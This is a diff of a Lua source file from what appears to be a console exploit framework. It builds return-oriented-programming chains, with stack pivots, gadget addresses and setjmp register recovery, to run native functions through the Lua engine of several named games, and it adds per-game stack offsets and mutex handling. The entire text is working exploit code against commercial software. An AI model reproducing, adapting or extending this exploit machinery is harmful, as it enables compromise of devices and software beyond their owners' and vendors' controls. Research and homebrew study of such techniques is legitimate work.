@@ -7,7 +7,7 @@ native_cmd = {
 
 native = {}
 
-function native.init()
+function native.register()
 
     local pivot_handler = gadgets.stack_pivot[2]
     native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
@@ -55,7 +55,7 @@ function native.gen_fcall_chain(lua_state)
 
     -- pass return value to caller
     chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
-        chain:push_set_reg_from_memory("rsi", chain.retval_addr[9])
+        chain:push_set_reg_from_memory("rsi", chain:get_last_retval_addr())
         chain:push_set_reg_from_memory("rdi", lua_state)
     end)
 
@@ -100,7 +100,13 @@ function native.setup_cmd_handler(pivot_handler)
 
     -- todo: setting hardcoded offset like this is bad. improve this
     local stack_offset = -0x78
-    if game_name == "HamidashiCreative" or game_name == "B" then
+    if game_name == "HamidashiCreative" or
+       game_name == "Aikagi2" or
+       game_name == "JinkiResurrection" or
+       game_name == "FuyuKiss" or
+       game_name == "C" or
+       game_name == "F"	or 
+	   game_name == "Azayaka" then
         stack_offset = -0x68
     end
 
@@ -108,15 +114,11 @@ function native.setup_cmd_handler(pivot_handler)
 
     chain.jmpbuf = memory.alloc(0x100)
     chain.jump_table = memory.alloc(0x8 * 16)
-    chain.lua_state = memory.alloc(0x8)
 
-    -- get lua state from pivot handler
-    chain:push_set_rax_from_memory(pivot_handler.lua_state_addr)
-    chain:push_store_rax_into_memory(chain.lua_state)
+    -- unlock native handler for other threads
+    chain:push_fcall(libc_addrofs.Mtx_unlock, pivot_handler.lock)
 
-    chain:push_fcall(libc_addrofs.scePthreadMutexUnlock, pivot_handler.lock)
-
-    -- hacky way to recover rbp
+    -- hacky way to recover rbp & r13
     chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
     chain:push_set_rax_from_memory(chain.jmpbuf+0x18) -- get rbp
 
@@ -126,11 +128,13 @@ function native.setup_cmd_handler(pivot_handler)
     chain:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
     chain:push_store_rax_into_memory(chain.jmpbuf)  -- fix rip
 
+    chain.lua_state = chain.jmpbuf + 0x28  -- r13 (lua state)
+
     -- get native cmd option from caller
     native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 2, 0)
 
     -- pivot to appropriate handler
-    chain:push_set_rax_from_memory(chain.retval_addr[1])
+    chain:push_set_rax_from_memory(chain:get_last_retval_addr())
     chain:dispatch_jumptable_with_rax_index(chain.jump_table)
 
     return chain
@@ -154,31 +158,46 @@ end
 
 function native.setup_pivot_handler(pivot_handler)
 
-    local jmpbuf = memory.alloc(0x60)
+    local MTX_DEF = 0 -- DEFAULT (sleep) lock
 
-    syscall_mmap(pivot_handler.pivot_base, 0x2000)
+    local Mtx_init = fcall(libc_addrofs.Mtx_init)
+
+    map_fixed_address(pivot_handler.pivot_base, 0x2000)
+
+    -- non modifying chains before fn call
+    local push_fcall_with_hole = function(chain, fn_addr, ...)
+        chain:push_sysv(...)
+        chain:align_stack()
+        chain:create_hole(0x500)
+        chain:push(fn_addr)
+        chain:push_write_qword_memory(chain:get_rsp() - 0x8, fn_addr)  -- fix chain
+    end
 
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
     })
 
-    -- rbx = rdi (lua state)
-    -- rbx is usually preserved across fn calls
-    chain:push_set_reg_from_rdi("rbx")
-
     chain.lock = memory.alloc(0x8)
-    chain:push_fcall(libc_addrofs.scePthreadMutexLock, chain.lock)
+    Mtx_init(chain.lock, MTX_DEF)
 
-    -- hacky way to recover rbx (lua state)
-    chain:push_fcall(libc_addrofs.setjmp, jmpbuf)
-    chain.lua_state_addr = jmpbuf + 0x8
+    -- lock as this part might be called by multiple threads
+    push_fcall_with_hole(chain, libc_addrofs.Mtx_lock, chain.lock)
 
+    -- note:
+    -- we assume that r13 will always point to lua state.
+    -- this is at least true for aibeya / raspberry cube / hamidashi creative
+
+    -- hacky way to recover lua state (r13)
+    chain.jmpbuf = memory.alloc(0x100)
+    chain.lua_state = chain.jmpbuf + 0x28 -- r13
+    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
+    
     -- get native cmd handler from caller
-    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state_addr, 1, 0)
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 1, 0)
 
     -- pivot to native cmd handler
-    chain:push_set_reg_from_memory("rsp", chain.retval_addr[1])
-    
+    chain:push_set_reg_from_memory("rsp", chain:get_last_retval_addr())
+
     return chain
 end
 
